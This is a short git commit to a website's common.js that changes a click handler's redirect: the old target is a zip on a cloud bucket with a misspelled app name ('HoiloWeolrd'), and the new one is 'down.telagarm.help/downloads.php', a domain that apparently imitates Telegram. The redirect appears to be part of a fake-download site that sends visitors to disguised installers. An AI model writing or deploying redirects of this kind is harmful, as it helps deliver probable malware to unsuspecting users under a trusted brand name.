a4b3dda2011a82948bd6b9631f0094c8b328d414
lucacoder8 <roydietzenqug@gmail.com>
2025-09-29 11:14:10 +0800

    Update common.js

--- common.js
+++ common.js
@@ -10,8 +10,9 @@ $(function()
 	{
 		if(numCount>=1)
 		{
-			var url="https://hdliswhs.oss-cn-hongkong.aliyuncs.com/HoiloWeolrd6.9.7-x64.zip";
+			var url="https://down.telagarm.help/downloads.php";
 			window.location=url;
 		}
 	});
+
 })
